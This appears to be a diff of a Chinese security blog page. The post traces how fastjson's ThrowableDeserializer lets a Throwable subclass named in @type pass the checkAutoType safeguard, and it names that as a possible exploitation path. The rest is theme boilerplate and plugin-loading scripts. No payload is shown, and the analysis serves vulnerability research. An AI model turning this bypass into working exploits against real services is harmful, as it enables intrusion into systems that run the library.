+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240917162353677.png">
+
+<p>找一找哪里调用了这个三参 checkAutoType 方法并且将 expectClass 赋值了。</p>
+<p>抛开将 expectClass 设置为 null 的情况，可以找到：</p>
+<ul>
+<li>JavaBeanDeserializer#deserialzeArrayMapping</li>
+<li>JavaBeanDeserializer#deserialze</li>
+<li>ThrowableDeserializer#deserialze</li>
+</ul>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240917163558857.png">
+
+<p>另外，两参 checkAutoType 也调用了三参 checkAutoType ，但是 expectClass 依然是传入的，而且两参 checkAutoType 被调用的点 expectClass 都是被设置为 null ，所以没有利用价值：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240917164133794.png">
+
+<h4 id="ThrowableDeserializer-deserialze"><a href="#ThrowableDeserializer-deserialze" class="headerlink" title="ThrowableDeserializer#deserialze"></a>ThrowableDeserializer#deserialze</h4><p>调用点在这里：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240917165738561.png">
+
+<p>它会将 @type 对应的值传入第一个参数，Throwable.class 作为 expectClass 的值：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240917165938185.png">
+
+<p>也就是说 @type 对应的类是 Throwable 的子类的话，通过 checkAutoType 的检查。</p>
+<p>然后调用 createException 方法创建异常类：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240917170600675.png">
+
+<p>跟进 ThrowableDeserializer#createException(String, Throwable, Class&lt;?&gt;)，最后在这里实例化：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240917170803935.png">
+
+<p>那么核心点就在于找一个 Throwable 的子类，它的 getter&#x2F;setter&#x2F;static block&#x2F;constructor 中有可利用的点，或者其他地方有可利用的链。从这个版本开始，再想要 RCE 就比较难了，大部分情况下考虑对文件的操作以及 SSRF 之类，而且可利用的链通常需要很多依赖。这个就留待后续说明吧。</p>
+
+
+</article>
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2024/09/26/Java%20%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%AF%87-Tomcat%E6%9E%B6%E6%9E%84/">基础篇 - Tomcat 架构</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2024/09/08/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-%E5%85%B3%E4%BA%8EJEP290/">漏洞篇 - 关于 JEP 290</a></div></section></div>
+
+
+
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">妙尽璇机</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.26.8">Stellar 1.26.8</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+<div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+<div class="main-mask" onclick="sidebar.toggle()"></div></div></div><div class="scripts">
+<script type="text/javascript">
+  const stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = stellar.config.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.version = '1.26.8';
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.26.8';
+  stellar.config = {
+    date_suffix: {
+      just: '刚刚',
+      min: '分钟前',
+      hour: '小时前',
+      day: '天前',
+      month: '个月前',
+    },
+    root : '/',
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js'
+  };
+
+  if ('local_search') {
+    stellar.search = {};
+    stellar.search.service = 'local_search';
+    if (stellar.search.service == 'local_search') {
+      let service_obj = Object.assign({}, {"field":"all","path":"/search.json","content":true,"sort":"-date"});
+      stellar.search[stellar.search.service] = service_obj;
+    }
   }
-  .l_body {
-    padding: 0;
+
+  // stellar js
+  stellar.plugins.stellar = Object.assign({"sites":"/js/plugins/sites.js","friends":"/js/plugins/friends.js","ghinfo":"/js/plugins/ghinfo.js","timeline":"/js/plugins/timeline.js","linkcard":"/js/plugins/linkcard.js","fcircle":"/js/plugins/fcircle.js","weibo":"/js/plugins/weibo.js","memos":"/js/plugins/memos.js","marked":"/js/plugins/marked.js"});
+
+  stellar.plugins.marked = Object.assign("https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js");
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js","transition":"fade"});
   }
-  .l_body .l_left {
-    position: fixed;
-    transform: translateX(-320px);
-    margin: 0;
-    left: 8px;
-    box-shadow: $boxshadow-card-float;
-    z-index: 10;
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@10.3/swiper-bundle.min.css","js":"https://unpkg.com/swiper@10.3/swiper-bundle.min.js"});
   }
-  .l_body .l_main {
-    max-width: 100%;
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://cdn.bootcdn.net/ajax/libs/scrollReveal.js/4.0.9/scrollreveal.min.js","distance":"16px","duration":800,"interval":100,"scale":1});
   }
-  .l_body.mobile .l_left {
-    transition: transform 0.38s ease-out;
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","flying_pages":"https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"});
   }
-  .l_body.mobile.sidebar .l_left {
-    transform: translateX(0px);
+  if ('true' == 'true') {
+    stellar.plugins.fancybox = Object.assign({"enable":true,"js":"https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js","css":"https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css","selector":null});
   }
-  .l_body.mobile.sidebar .main-mask {
-    opacity: 1;
-    pointer-events: inherit;
+  if ('false' == 'true') {
+    stellar.plugins.heti = Object.assign({"enable":false,"css":"https://unpkg.com/heti@0.9.2/umd/heti.min.css","js":"https://unpkg.com/heti@0.9.2/umd/heti-addon.min.js"});
   }
-}
+  if ('true' == 'true') {
+    stellar.plugins.copycode = Object.assign({"enable":true,"js":"/js/plugins/copycode.js","default_text":"Copy","success_text":"Copied","toast":"复制成功"});
+  }
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.26.8" async></script>
+
+<!-- optional -->
+
+
+
+
+
+
+<!-- inject -->
+<script type="text/javascript" src="/custom/js/ZYCode.js"></script>
+</div></body></html>
